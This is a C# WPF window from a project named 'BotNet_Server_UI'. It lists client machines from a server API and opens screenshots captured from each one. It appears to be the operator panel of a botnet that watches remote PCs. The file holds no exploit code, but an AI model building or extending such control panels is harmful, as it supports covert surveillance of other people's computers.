// This code is licensed under the isc license. You can improve the code by keeping this comments 
// (or by any other means, with saving authorship by Zerumi and PizhikCoder retained)
using System;
using System.Collections.Generic;
using System.Windows;
using System.Windows.Controls;

namespace BotNet_Server_UI
{
    /// <summary>
    /// Логика взаимодействия для Demos.xaml
    /// </summary>
    public partial class Demos : Window
    {
        public string nameofpc;

        public Demos()
        {
            InitializeComponent();
        }

        readonly List<IP> ip = new List<IP>();
        private async void DmsForm_Loaded(object sender, RoutedEventArgs e)
        {
            List<Button> buttons = new List<Button>();
        linkarrip:
            IP[] arr = await ApiRequest.GetProductAsync<IP[]>($"/api/v{ApiRequest.ApiVersion}/client");
            if (arr == null)
            {
                goto linkarrip;
            }
            for (int j = 0; j < arr.Length; j++)
            {
                if (await ApiRequest.GetProductAsync<Frame>($"/api/v{ApiRequest.ApiVersion}/screens/" + arr[j].id) == default(Frame))
                {
                    continue;
                }
                ip.Add(arr[j]);
            }
            for (int i = 0; i < ip.Count; i++)
            {
                string name = Convert.ToString(ip[i].id);
                buttons.Add(new Button()
                {
                    Name = "b" + name,
                    Content = "Скриншоты " + ip[i].nameofpc
                });
                buttons[i].Click += Screens_Click;
                ListDemos.Items.Add(buttons[i]);
            }
        }

        private async void Screens_Click(object sender, RoutedEventArgs e)
        {
            var element = e.OriginalSource as FrameworkElement;
            var name = element?.Name;
            var screen = await ApiRequest.GetProductAsync<Screen>($"/api/v{ApiRequest.ApiVersion}/screens/" + name.Remove(0, 1));
            nameofpc = ip.Find(x => x.id == Convert.ToInt32(name.Remove(0, 1))).nameofpc;
            ScreenBox screenBox = new ScreenBox(screen.screens, nameofpc)
            {
                Title = "Скриншоты " + nameofpc
            };
            screenBox.Show();
        }
    }
}